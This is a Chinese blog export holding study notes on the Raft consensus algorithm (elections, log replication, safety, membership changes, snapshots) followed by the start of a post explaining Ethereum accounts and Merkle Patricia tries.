<p>复制状态机通过日志实现，每个服务器上的日志保存着一系列命令，服务器上的状态机(state machine)会顺序执行这些命令。每个日志中的命令序列都是相同的，因此每个状态机都执行相同顺序的命令，并得到相同的状态和输出。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image.png" alt="1"></p>
<p>复制状态机中，共识算法是为了保证日志的一致性。当服务器上的共识模块(consensus module)收到客户的命令后，会将命令添加到它的日志中，并与其它服务器上的共识模块通信，以保证每个日志中命令序列都是相同的。一旦日志被正确地复制，每台服务器上的状态机就会执行日志中的命令，并将结果返回给客户端。</p>
<p>在实际系统中，共识算法通常有以下特性：</p>
<ul>
<li>在非拜占庭情况下，保证安全性（不返回错误的结果）。</li>
<li>在大多数节点可用的情况下，保证可用性。比如5个节点的集群可容忍2个节点的失效。并且，当节点失效时，它们可以恢复并重新加入集群。</li>
<li>不依赖时间来保证日志的一致性（？）。</li>
<li>只要大多数节点返回响应，命令就算完成，少数较慢的节点不会影响系统性能。</li>
</ul>
<h3 id="3-What’s-wrong-with-Paxos"><a href="#3-What’s-wrong-with-Paxos" class="headerlink" title="3 What’s wrong with Paxos?"></a>3 What’s wrong with Paxos?</h3><p>过去十年，Paxos就是共识的代名词。</p>
<p>Paxos首先定义了能就单个决策达成共识的协议，被称为单决策Paxos（single-decree Paxos）。然后Paxos组合该协议的多个实例以实现一系列决策，被称为multi-Paxos。</p>
<p>Paxos有两个显著的缺点：</p>
<ol>
<li>难以理解。论文假定Paxos的复杂性源于它以单决策子集为基础，而单决策Paxos是复杂的。它分为两个阶段，没有简单直观的解释，也无法单独地去理解。因此，这导致multi-Paxos更难以理解。作者相信有更直接显著的方法，就多项决策达成共识。</li>
<li>难以具体实现。一个原因是Lamport（Paxos作者）仅构想了实现multi-Paxos的可能方法，但许多细节有所欠缺。此外，Paxos的架构很难应用到实际系统中。</li>
</ol>
<p>许多系统实现都从Paxos开始，但发现实现上存在困难，然后开发成另一种不同的架构。</p>
<p>为了解决这些，论文设计了Raft。</p>
<h3 id="4-Designing-for-understandability"><a href="#4-Designing-for-understandability" class="headerlink" title="4 Designing for understandability"></a>4 Designing for understandability</h3><p>设计Raft时的一些目标：</p>
<ul>
<li>必须易于实现。</li>
<li>必须在所有情况下保证安全性，在常见情况下保证可用性。</li>
<li>对于普通操作必须高效。</li>
<li>易于理解（最大的目标与挑战）。</li>
</ul>
<p>使用两种方法来实现易于理解：</p>
<ol>
<li>问题分解</li>
<li>减少状态数</li>
</ol>
<h3 id="5-The-Raft-consensus-algorithm"><a href="#5-The-Raft-consensus-algorithm" class="headerlink" title="5 The Raft consensus algorithm"></a>5 The Raft consensus algorithm</h3><p>Raft是一种用于管理第2节中可复制日志（replicated log）的共识算法。图2是算法的压缩总结，以供参考。图3列举了算法的关键属性。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_1.png" alt="1"></p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_2.png" alt="1"></p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_3.png" alt="1"></p>
<p>Raft首先会选举一个独立的leader，让leader全权负责日志复制。leader从客户端获取命令（日志记录 log entries），然后将其复制给其它服务器，并告诉其它服务器什么时候执行才是安全的。当leader失效时，会选举出新的leader。</p>
<p>通过leader机制，Raft将共识问题分解为三个子问题：</p>
<ul>
<li>Leader election（5.2节）</li>
<li>Log replication（5.3节）</li>
<li>Safety：在日志中的同一位置，不同服务器上的状态机应执行相同命令（5.4节）</li>
</ul>
<p>在介绍了共识算法之后，本节将讨论可用性和定时(timing)在系统中的作用。</p>
<h4 id="5-1-Raft-basics"><a href="#5-1-Raft-basics" class="headerlink" title="5.1 Raft basics"></a>5.1 Raft basics</h4><p>Raft集群包含多个节点，通常有5个节点就能容忍2个节点出错。</p>
<p>任意时刻，集群中节点只有三种状态：leader、follower、candidate。在正常情况下，有一个leader，其它都是follower。follower节点不发出请求，只响应leader或candidate的请求。leader节点处理所有客户端请求，如果follower收到客户端，会转交给leader。candidate状态则用于leader选举。各状态间的相互转换如下图：</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_4.png" alt="1"></p>
<p>如下图，Raft将时间分为不同长度的任期(terms)，terms的序号是连续的。每个term都开始于一次选举election，选举中一或多个candidate竞争一个leader，如果某个candidate赢得选举，将在当前term的剩余时间内担任leader。</p>
<p>在某些情况下，可能会出现相等的票数（比如A和B都得到3票），那么当前term就会以无leader的情况(<strong>no leader</strong>)结束，一个新的term很快就会开始。Raft会保证一个term最多只有一个leader。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_5.png" alt="1"></p>
<p>不同节点可能在不同时间察觉到term的变动，在某些情况下，节点甚至察觉不到某次选举或整个term。</p>
<p>在Raft中，terms扮演了逻辑时钟的角色，可以让节点发现一些过期的信息，比如已失效的leader。</p>
<p>每个节点都保存着一个<strong>当前term序号(current term number)<strong>，并随着时间递增。</strong>当节点进行通信时，会交换当前term的序号，如果节点发现它的term序号较小时，它会将其更新成那个较大的值</strong>。当leader或candidate发现它的term已过期时，它会立即变为follower状态。如果节点收到一个携带已过期term序号的请求，它会拒绝这个请求。</p>
<p>Raft中，节点间使用RPCs通信，最基础的共识算法只需要两种类型的RPCs：</p>
<ul>
<li>RequestVote RPCs，由candidate发起，用于选举。</li>
<li>AppendEntries RPCs，由leader发起，用于复制日志和心跳提醒。</li>
</ul>
<h4 id="5-2-Leader-election"><a href="#5-2-Leader-election" class="headerlink" title="5.2 Leader election"></a>5.2 Leader election</h4><p>Raft采用一种心跳机制来触发leader选举。当节点刚启动时，它处于follower状态。当它收到来自candidate或leader的RPC请求时，它会保留为follower状态。因此，leader会定期地发送心跳提醒(heartbeats)给所有follower，以维持它的统治。当follower在一段时间内(election timeout)都没有收到消息时，它会假定当前leader已失效，然后开始新的竞选。</p>
<p>当开始竞选，follower会将当前term序号加1，然后转变为candidate状态。它先会投票给自己，然后并行地发送RequestVote RPC请求给其它节点。直到以下三种情况出现，节点才会改变candidate状态：</p>
<ol>
<li>节点赢得选举。</li>
<li>其它节点成为leader。</li>
<li>一个周期时间过去任未选出leader。</li>
</ol>
<p>当candidate节点得到集群中大多数节点针对当前同一term的投票，它将赢得选举胜利。在一个term内，节点只能对最多一个candidate进行投票，并遵循先到先得的原则。得到大多数投票，能保证在一个term内，最多只有一个candidate获胜。一旦某个candidate获胜成为leader，它将定期发送心跳heartbeats信息给其它所有节点，以维持它的统治。</p>
<p>当candidate在等待投票过程中，收到刚成为leader节点的AppendEntries RPC请求，且请求的term序号<strong>大于等于</strong>它的term序号时，它将会认可这个leader的合法性，并转变为follower状态。如果请求的term序号小于它的term序号时，它会拒绝请求并保持candidate状态。</p>
<p>当没有candidate胜出，比如大多数follower同时变为candidate，导致没有candidate能获得大多数投票时，每个candidate都会等待超时，然后将当前term序号加1，开始新一轮的竞选。当然，如果没有额外的措施，这种情况可能无限重复。</p>
<p>Raft使用<strong>随机化</strong>的选举等待时间来解决上述**投票分裂(split votes)<strong>问题：每个candidate节点开始竞选时，会从某个区间（比如150-300ms）内随机选择</strong>选举等待时间(election timeout)**。这将导致在大多情况下，只有一个节点率先超时进入下一次选举，并在其它节点超时之前赢得选举。</p>
<h4 id="5-3-Log-replication"><a href="#5-3-Log-replication" class="headerlink" title="5.3 Log replication"></a>5.3 Log replication</h4><p>一旦某个leader被选举出来，它将处理客户端请求。每个客户端请求包含一条可被复制状态机执行的命令。leader会将这条命令追加到它的日志中，然后并行地发送AppendEntries RPCs请求，复制这条命令给其它节点。当这条命令被安全地复制，leader将让它的状态机执行这条命令，并返回结果给客户端。如果followers崩溃或网络堵塞，leader将会重复地发送请求，直到所有follower都保存了这条命令。</p>
<p>日志如下图所示，类似于有序数组，日志中每条记录都包含一条命令和对应的term序号。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_6.png" alt="1"></p>
<p>如果某条日志记录可以安全地执行，那leader会标记这条记录为<strong>已提交的(committed)<strong>。</strong>Raft会保证已提交的记录是持久的（不会被删除或覆盖），且最终被所有节点执行</strong>。当记录<strong>被复制到大多数节点</strong>时，它就可以被标记为已提交的，比如上图中的第7条记录。leader会保存日志中<strong>已提交记录的最大索引</strong>，比如上图中最大已提交索引为7。它会在AppendEntries RPCs请求中包含这个值，以便让其它节点知晓。<strong>一旦某个follower节点得知某条记录已提交，它便会执行记录中的命令</strong>（按日志中记录的顺序）。</p>
<p>Raft会维持如下特性，这些特性构成了图3种的**日志匹配属性(Log Matching Property)**：</p>
<ul>
<li>如果不同日志中的两条记录拥有相同的索引和任期号，那么它们存储了相同的指令。</li>
<li>如果不同日志中的两条记录拥有相同的索引和任期号，那么它们之前的所有日志条目也都相同。</li>
</ul>
<p>一个任期号至多对应一个leader，且leader在任期号内的一个索引处只能创建一条记录，这保证第一条特性。第二条特性由AppendEntries RPCs请求时<strong>一致性检查</strong>保证：当leader发送AppendEntries RPCs请求时，会将新日志记录的<strong>上一条记录的索引和term号（其实就是已提交记录的最大索引和其term号）</strong>包含在内。如果follower在它日志中没有找到<strong>相同的索引和term号</strong>，它就会拒绝请求（保证一致性）。</p>
<p>在某些情况下，旧leader发生崩溃，那么新的leader与follower日志可能不同：新leader中的日志记录可能比某些follower多，也可能比某些follower少。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_7.png" alt="1"></p>
<p>Raft中，leader通过强制follower的日志保持与自己一致，来解决不一致问题（5.4节将解释，当附加了一个至多个限制时，这是安全的）。</p>
<p>leader为了让follower的日志与自己一致，<strong>会找到两者日志中一致且索引最大的记录，然后删除follower日志中的剩余记录，再将leader日志中剩余记录追加到follower日志中</strong>。</p>
<p>leader为每个follower都维护了一个**下一个索引值(nextIndex)**，用于标识下一个将发送给follower的日志记录。当leader首次启动时，它会初始所有nextIndex为它日志中最后一条记录的下一个索引。如果follower的日志与leader的不一致，AppendEntries RPC请求将会失败。当leader收到拒绝响应时，它会将follower对应的nextIndex减1，然后再重试。最终，nextIndex会达到leader和follower中日志相一致的索引处。此时，AppendEntries RPC请求将成功响应，follower会删除冲突的部分，并将leader发来的记录追加到它的日志中。</p>
<p>这部分算法可以被优化：当follower发现不一致时，返回term序号和term内的第一个索引，leader借此可以跳过这个term。但在实践中，作者发现这种优化没有必要，因为失败不经常发送，且冲突记录并不多。</p>
<p>通过这种机制，既能保证一致性，又能保证少数过慢的机器不会影响系统性能。</p>
<h4 id="5-4-Safety"><a href="#5-4-Safety" class="headerlink" title="5.4 Safety"></a>5.4 Safety</h4><p>上述机制还存在一个问题：不能保证每个节点都按相同顺序执行了相同的命令。比如，某个follower处于失效状态时，leader提交了多条日志记录，而后这个follower生效被选为新leader，它将覆盖这些已提交的记录。</p>
<p>本节通过对leader选举进行限制，来完善Raft算法。这种限制能保证：在任意term内，leader都包含了之前各term内已提交的日志记录。</p>
<h5 id="5-4-1-Election-restriction"><a href="#5-4-1-Election-restriction" class="headerlink" title="5.4.1 Election restriction"></a>5.4.1 Election restriction</h5><p>在选举时，Raft规定只有日志中包含<strong>所有已提交记录</strong>的candidate才能赢得竞选，这就意味着所有已提交记录必须至少存在于一个节点上。</p>
<p>如果candidate的日志至少与大多数节点的日志一样**新(up-to-date)**，那么它就拥有全部的已提交记录。</p>
<p>这个投票限制通过RequestVote RPC请求实现：RPC请求会包含candidate的日志信息，<strong>如果投票者的日志比candidate的新，它就会拒绝投票。</strong></p>
<p>Raft通过比较两个日志中最后一条记录来判断谁更新：<strong>term序号大的更新；term序号相等但日志更长的更新</strong>。</p>
<h5 id="5-4-2-Committing-entries-from-previous-terms"><a href="#5-4-2-Committing-entries-from-previous-terms" class="headerlink" title="5.4.2 Committing entries from previous terms"></a>5.4.2 Committing entries from previous terms</h5><p>由上文可知，leader只有得知大多数节点保存了当前日志记录后，才会提交该记录。如果leader在提交该记录前崩溃了，那么新leader会尝试继续完成该记录的复制。然而，如果前一条记录被复制到大多数节点，leader也无法判断该记录是否已提交。下图展示了在旧leader下被复制到大多数节点的记录，可能被新leader覆盖。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_8.png" alt="1"></p>
<p>图8描述了一种情况：(a)中，S1被选为leader(term 2)，复制2索引处的记录到S1、S2。(b)中，S1崩溃，S5被选为leader(term 3)，投票来自S3、S4、S5，它在2索引处获得新记录。(c)中，S5崩溃，S1重新被选为leader(term 4)，为了保证日志一致，它会继续复制索引2处term 2内的记录到其它节点，如果得到超过半数的复制成功响应，它就会提交该记录（也意味着会执行该记录）。但在(d)中，S1崩溃，S5重新选为leader，它也会继续复制索引2处term 3内的记录到其它节点，此时，就会覆盖索引2处term 2的已提交记录（S1执行过的命令被覆盖，违背持久性）。如果，回到(c)中，S1复制索引2处term 2内的记录到其它节点，得到大多数成功响应，但并不标记这个记录为已提交，而是等到自己term内的记录复制到大多数，才标记自己term内的记录已提交，那就会避免这个问题，既能提交旧term内的记录，也能保证一致。</p>
<p>为了解决这个问题，Raft不会通过统计是否复制到大多数节点，来提交之前任期(term)内的日志记录。<strong>只有当前term内的日志记录，才会通过统计是否复制到大多数节点来提交</strong>。因为，一旦当前term内的记录被提交，所有此前的记录都会被提交（参考5.3节）。</p>
<h5 id="5-4-3-Safety-argument"><a href="#5-4-3-Safety-argument" class="headerlink" title="5.4.3 Safety argument"></a>5.4.3 Safety argument</h5><p>此节讨论Raft的安全性，主要通过反证法进行论证。假设任期T内的leaderT在任期内提交了一个日志记录，但是该日志记录没有被存储到未来某个任期U的 leaderU 中，然后反证这种情况不可能发生。</p>
<p>详细内容略。</p>
<h5 id="5-5-Follower-and-candidate-crashes"><a href="#5-5-Follower-and-candidate-crashes" class="headerlink" title="5.5 Follower and candidate crashes"></a>5.5 Follower and candidate crashes</h5><p>如果follower或candidate崩溃，发送给它们的RPC请求会无限重试，直到它们重启后成功响应。</p>
<h5 id="5-6-Timing-and-availability"><a href="#5-6-Timing-and-availability" class="headerlink" title="5.6 Timing and availability"></a>5.6 Timing and availability</h5><p>Raft中，系统的安全性不能依靠定时：不能因为某些事件发生得过慢或过快，就产生错误的结果。但是系统的可用性（规定时间内响应用户）却必须依靠定时，比如：消息传播过慢，导致candidate没有足够时间赢得选举，进而导致选不出稳定的leader。</p>
<p>定时是leader选举的关键，为了选举并维持一个稳定的leader，系统必须满足如下定时需求：</p>
<blockquote>
<p>广播时间(broadcastTime) &lt;&lt; 选举超时时间(electionTimeout) &lt;&lt; 平均故障间隔时间(MTBF)。</p>
</blockquote>
<p>广播时间是节点并行地发生RPC请求且收到响应的平均时间；选举超时时间参考5.2节；MTBF是节点故障恢复的平均时间。广播时间应该比选举超时时间小一个量级，这样 leader 才能通过发送心跳消息来阻止 follower 开始进入选举状态。选举超时时间应该比平均故障间隔时间小上几个数量级，这样才能在leader崩溃期间，快速选出新leader保证系统可用。</p>
<p>广播时间和MTBF由具体情况而定，但选举超时时间可自定义。通常，广播时间大约是0.5ms-20ms，因此选举超时时间可定义为10ms-500ms。</p>
<h3 id="6-Cluster-membership-changes"><a href="#6-Cluster-membership-changes" class="headerlink" title="6 Cluster membership changes"></a>6 Cluster membership changes</h3><p>实际中，某些时刻需要更新系统的配置（系统节点信息），即集群变更，比如某些节点永久失效需要被替换时。一个方法是将所有节点下线，更新完成后再手动重启，但这样会导致系统某段时间不可用。此外，通过手动操作也会产生意料之外的错误。于是，Raft针对集群变更设计自动化机制。</p>
<p>当然，在集群变更过程中，会产生一些问题：由于一次性改变所有节点配置是不可能的，那么在某个时刻，旧配置节点与新配置节点共存，可能出现两个leader。如下图，1、2在旧配置（只有3个节点）中，3、4、5在新配置（有5个节点）中，1获得了2的投票，它就会认为得到大多数投票，成为leader；而5获得3、4的投票，它也会成为leader。这样同一时刻就有两个leader。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_9.png" alt="1"></p>
<p>为了保证集群变更时的安全性，需使用<strong>两阶段(two-phase)方法</strong>。这种方法有许多实现方式，比如：一些系统，在第一阶段先停止旧配置节点，让其不能接收请求；然后在第二个阶段启动新配置节点。</p>
<p>在Raft中，集群首先切换到一个中间状态，称为<strong>联合一致(joint consensus)<strong>。一旦joint consensus被提交，系统就可以过渡到新配置。在joint consensus状态中，系统同时包含旧配置和新配置，并遵循以下机制（相当于</strong>旧新配置的并集</strong>）：</p>
<ul>
<li>日志会复制到新旧配置中的所有节点。</li>
<li>新旧配置中的节点都可以成为leader。</li>
<li>选举和日志提交，<strong>既需要得到旧配置中大多数节点的同意，也需要得到新配置中大多数节点的同意</strong>。这能保证新旧配置leader不会同时出现，比如上图10中，5想要成为leader，就需要同时得到旧配置（1、2、3）下的大多数投票，和新配置（1、2、3、4、5）下的大多数投票。</li>
</ul>
<p>集群配置作为<strong>特殊的日志记录</strong>进行存储。下图展示了配置变更过程。当leader收到配置变更的请求($C_{old}$→$C_{new}$)时，它会将中间态配置$C_{old,new}$（相当于新旧配置的并集）存储为一个日志记录，然后按照如上机制复制到系统其它节点。（一旦节点添加了新的配置记录到日志中，它将会使用该配置进行未来的全部决策。且节点总是使用日志中最新的配置记录，无论该记录是否提交）。leader会使用$C_{old,new}$配置来判断$C_{old,new}$记录是否已提交，如果leader宕机，一个<strong>新的leader会从$C_{old}$或$C_{old,new}$配置的机器中选出</strong>。在任何情况中，$C_{new}$的配置都不会产生任何决策。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_10.png" alt="1"></p>
<p>一旦$C_{old,new}$配置已提交，不管$C_{old}$或$C_{new}$配置的节点都不能单独决策（因为按照中间态的机制，决策既要得到旧配置中大多数节点的同意，也需要得到新配置中大多数节点的同意）。且$C_{old,new}$配置已提交能保证它被复制到大多数节点，即只有$C_{old,new}$配置的节点才能选为leader。此时，leader可以安全地创建$C_{new}$配置的日志记录，并复制到集群。当$C_{new}$配置被提交，不在新配置下的节点将被关闭。</p>
<p>关于配置变更还有3个问题：</p>
<ol>
<li>新节点没有存储任何日志记录。新节点刚加入系统时，需要一段时间赶上进度。为了避免这段时间系统不可用，Raft在配置变更阶段之前引入一个新阶段。在这个阶段中，新节点加入到系统中，但不参与投票，leader依然会将日志复制给它们。直到新节点的日志赶上其它节点，才会进入配置变更阶段。</li>
<li>leader 可能不是新配置节点中的一员。在这种情况下，leader 一旦提交了$C_{new}$配置的日志记录（复制到大多数）就会退位（回到 follower 状态）。然后新配置中的节点将被选为leader，在此之前只有旧配置中的节点才会被选为leader。</li>
<li>被移除的节点可能会扰乱集群。这些节点因为没收到心跳提醒，会超时，然后开始新一轮选举，并发送带有新term号的RequestVote RPC请求给新配置下的节点，这会导致新配置下的leader变为follower状态。为了防止这个问题，<strong>当节点知晓当前leader存在时，它会拒绝RequestVote RPC请求，即使请求的term号更大</strong>。</li>
</ol>
<p>根据上述集群变更机制，重新考虑图10中的情况。首先，4、5节点先要将日志追上进度，再参与投票。此时，作为leader的3节点收到集群变更的命令，但它只将$C_{old,new}​$配置记录发送到4、5节点，就失效了。然后，1节点（它并不知道4、5节点，但获得1、2节点的投票）成为新的leader。此时，5节点也收到3、4、5节点的投票，但它不能成为leader，因为它还要得到旧配置（1、2、3节点）中大多数节点的同意。</p>
<h3 id="7-Log-compaction"><a href="#7-Log-compaction" class="headerlink" title="7 Log compaction"></a>7 Log compaction</h3><p>Raft中，日志会越来越长，这会导致日志占用空间越来越大，重新执行日志花费的时间也会更长。为了防止日志无限增长，Raft需要压缩日志。</p>
<p>快照是最简单的压缩方法。系统会将当前状态以快照方式持久化存储，而该时间点前的日志全部丢弃。</p>
<p>Raft中的快照机制如下图。每个节点独立地生成快照，具体工作是将状态机的当前状态存储到快照中，因此只有已提交的日志记录才会被快照替代（已提交才会被状态机执行）。Raft也会在快照中保存相关元数据：last included index是被快照替代的日志序列中最后一个记录的索引，last included term是被快照替代的日志序列中最后一个记录的term号，它们主要用于支持AppendEntries RPC请求时的一致性检查。为了支持集群成员变更，还会包含被快照替代的日志序列中最后一条配置信息。一旦快照成功保存，节点会删除包括last included index在内的之前所有日志记录。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_11.png" alt="1"></p>
<p>当leader需要发送已被快照替代的日志记录给某些follower时，它应该发送快照给对方，这种情况发生在某些follower较慢或刚加入集群时。</p>
<p>leader使用InstallSnapshot RPC请求（如下图）发送快照给一些落后的follower。当follower收到InstallSnapshot RPC请求时，它会丢弃快照之内的日志记录，只保留不在快照中的剩余记录，若已提交索引小于快照最后索引，还会更新自己的已提交索引，最后将快照应用到状态机中。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft/image_12.png" alt="1"></p>
<h3 id="8-Client-interaction"><a href="#8-Client-interaction" class="headerlink" title="8 Client interaction"></a>8 Client interaction</h3><p>当一个客户端初次启动时，它会随机连接到一个节点。若节点并非leader，它会返回当前leader节点的信息给客户端。如果leader宕机了，客户端会请求超时，然后再尝试连接一个随机节点。</p>
<p>Raft需实现线性语义化(linearizable semantics)，即一条指令只执行一次。实际情况中，一条指令可能执行多次，比如leader执行完某条指令，但在响应客户端时宕机了，客户端会重试连接，并重新发送这条指令，那么这条指令就会被执行两次。解决方法是对每条指令附加一个唯一标识，当状态机收到一条标识重复的指令时，它会直接返回而不执行。</p>
<p><strong>只读操作</strong>不需要写入到日志中，但是系统可能会返回过期的数据，比如：响应只读请求的leader可能不知道新leader已经出现了，因为不产生日志则不需要发送日志复制请求。Raft采取两个额外措施来解决这个问题：</p>
<ol>
<li>leader必须知道哪些记录是已提交的。根据特性，leader一定包含所有已提交记录，但新leader一开始并不知道哪些记录是已提交的。对此，<strong>Raft要求每个leader在任期开始时，提交一个空的no-op类型的日志记录</strong>。</li>
<li>leader在处理只读请求之前，必须检查自己是否已过时。Raft要求leader在响应只读请求时，必须向集群内过半节点请求并响应一次心跳信息。</li>
</ol>
<h3 id="9-Implementation-and-evaluation"><a href="#9-Implementation-and-evaluation" class="headerlink" title="9 Implementation and evaluation"></a>9 Implementation and evaluation</h3><p>略。</p>
<h3 id="10-Related-work"><a href="#10-Related-work" class="headerlink" title="10 Related work"></a>10 Related work</h3><p>略。</p>
<h3 id="11-Conclusion"><a href="#11-Conclusion" class="headerlink" title="11 Conclusion"></a>11 Conclusion</h3><p>略。</p>
<h3 id="12-Acknowledgments"><a href="#12-Acknowledgments" class="headerlink" title="12 Acknowledgments"></a>12 Acknowledgments</h3><p>略。</p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链2.0——以太坊</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A.html</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><p>如果说比特币是区块链1.0，那以太坊就是区块链2.0。比特币的出现，让大规模、去中心化的电子货币交易成为可能。而以太坊的出现，让任何人都能构建去中心化的合约与应用。根据白皮书的标题，我们也可以清晰地知道：比特币的核心是点对点电子货币，而以太坊的核心是智能合约与去中心化应用。</p>
<span id="more"></span>

<h1 id="1-比特币回顾"><a href="#1-比特币回顾" class="headerlink" title="1. 比特币回顾"></a>1. 比特币回顾</h1><h2 id="状态转移系统"><a href="#状态转移系统" class="headerlink" title="状态转移系统"></a>状态转移系统</h2><p>在以太坊白皮书中提到，从技术角度，比特币就是一个状态转移系统(state transition system)。状态是系统中各个账户的剩余比特币，准确一点，是各账户的UTXO。每当成功发生一笔交易，就是从一个状态转移到一个新的状态。比如，状态1中A有10个币B有2个币，发生一笔交易A→B 5个币，就会转移到状态2（A有5个币，B有7个币）。</p>
<blockquote>
<p>From a technical standpoint, the ledger of a cryptocurrency such as Bitcoin can be thought of as a state transition system, where there is a “state” consisting of the ownership status of all existing bitcoins and a “state transition function” that takes a state and a transaction and outputs a new state which is the result.</p>
</blockquote>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在比特币中，存在一个弱化版的智能合约——交易脚本。交易脚本除了能实现基本的交易验证功能之外，还能实现一些稍微复杂的功能，比如：多重签名，需要3个公私钥账户中2个的签名，才能完成验证。</p>
<p>但比特币中的脚本语言存在一定的局限性，比如：<strong>缺乏图灵完备性</strong>。无法直接循环运算，这样做是避免交易验证时出现无限循环。</p>
<h1 id="2-账户"><a href="#2-账户" class="headerlink" title="2. 账户"></a>2. 账户</h1><p>比特币是<strong>基于交易</strong>的记账系统，当统计某个账户(地址)有多少币时，需要遍历区块链上该账户的未花费币，即UTXO。而以太坊是<strong>基于账户</strong>的记账系统，全节点会保存系统中所有账户的信息，可以直观地看到账户的余额。</p>
<p>为什么要使用基于账户的记账系统？因为以太坊的核心在于智能合约，为了方便智能合约的制定与执行，需要依靠账户系统。</p>
<p>相比于基于交易，基于账户的记账系统<strong>不用考虑双花攻击</strong>。因为不需要指向上一笔交易，付款金额从账户中扣除，若付款方将同一笔交易公布两次，相当于花了自己两笔钱。但是，基于账户的系统会出现<strong>重放攻击</strong>，即收款方将同一笔交易再次公布，以此收取两笔钱。为了解决这个问题，以太坊为每个账户保存一个记录交易数量的值nonce，并在交易中包含一个序号，规定序号大于nonce时交易才有效。</p>
<h2 id="账户类型"><a href="#账户类型" class="headerlink" title="账户类型"></a>账户类型</h2><p>以太坊中包含两类账户：</p>
<ul>
<li><p>**外部持有账户(externally owned accounts)**，即普通账户，自行产生公私钥加入系统。</p>
</li>
<li><p>**合约账户(contract accounts)**，用于智能合约。</p>
</li>
</ul>
<h2 id="账户字段"><a href="#账户字段" class="headerlink" title="账户字段"></a>账户字段</h2><p>以太坊帐户有四个字段：</p>
<ul>
<li><p><code>nonce</code> - 记录从帐户发起的交易数量，即交易数量计数器，初始化为0。这确保交易只处理一次，防止重放攻击。在合约帐户中，这个数字代表该帐户创建的合约数量(?)。</p>
</li>
<li><p><code>balance</code> - 账户余额，拥有的Wei数量(1 ETH&#x3D;1e+18 Wei)。</p>
</li>
<li><p><code>codeHash</code> - 合约帐户所拥有的代码片段。所有代码片段都被保存在状态数据库的相应哈希下，供后续检索。对于普通帐户，该字段为空。</p>
</li>
<li><p><code>storageRoot</code> - 存储合约账户的相关状态，其值是Merkle Patricia trie根节点的哈希值。</p>
</li>
</ul>
<h2 id="账户地址"><a href="#账户地址" class="headerlink" title="账户地址"></a>账户地址</h2><p>用户先随机生成一个私钥，通过椭圆曲线算法生成公钥，再通过Keccak-256哈希生成256位的数，取最后160位（20个字节）作为账户地址。</p>
<h2 id="账户存储——状态树"><a href="#账户存储——状态树" class="headerlink" title="账户存储——状态树"></a>账户存储——状态树</h2><p>虽然账户带来了便利，但也制造了一些麻烦：每个全节点需要保存各个账户的状态，同时还要对这些账户状态达成共识。为此，以太坊使用了一种Merkle Patricia trie(MPT)的数据结构，对账户状态进行存储。存储账户状态的这棵MPT，又被称为状态树。</p>
<p>Merkle Patricia trie的由来如下：</p>
<ol>
<li>trie: 字典树&#x2F;前缀树</li>
</ol>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_Lwh1MdIhBt.png" alt="1"></p>
<ol start="2">
<li>Patricia trie: 经路径压缩的前缀树</li>
</ol>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_8I3tSzL9Ma.png" alt="1"></p>
<ol start="3">
<li><p>Merkle Patricia trie: 使用哈希指针的Patricia trie</p>
</li>
<li><p>Modified Merkle Patricia trie: 以太坊中所使用的，做了稍许修改</p>
</li>
</ol>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_9Ahd_bsSmf.png" alt="1"></p>
<p>为什么不使用hash表？账户地址与状态有着明显的一对一关系，若使用hash表，查找、增加、更新都是O(1)时间复杂度。但是，hash表不利于达成共识。为了保证各节点之间账户状态的一致性，每次都在发布区块中包含所有账户的状态是不可能的。而常用方法是：取一个总哈希值，每次发布区块时，各节点对这个哈希值达成共识。然而，每次生成区块，都会有账户状态发生变化，那就需要对所有账户重新取哈希，工作量极大。</p>
<p>为什么不使用Merkle树？使用默克尔树结构的好处在于：账户状态发生更新时，只需要更新对应叶子节点到根节点路径上的哈希值。但是，默克尔树对新增账户并不友好。在叶子节点中，不同的排序会产生不同的根哈希值。如果按照账户地址排序，那么新增账户的地址有可能在序列的中间，将导致大半棵树重新计算。</p>
<p>为什么使用MPT树？账户地址等长，20个字节，用16进制表示则有40个字符，那么树最大高度就是40，查询复杂度并不高。账户更新时，只需更新到根节点路径上的哈希值即可。新增账户时，不会影响其它账户，也只用更新到根节点路径上的哈希值。<strong>发布区块时，只需在区块体中包含变化账户的信息，大家会对区块头中状态树的根节点哈希值达成共识。</strong></p>
<p>同时，以太坊中还有另外两棵树——<strong>交易树</strong>和<strong>收据树</strong>，它们都采用MPT的数据结构。收据是交易执行后产生的信息，与交易一一对应，用于智能合约。交易树和收据树都只包含当前区块中的交易数据，而非全部。</p>
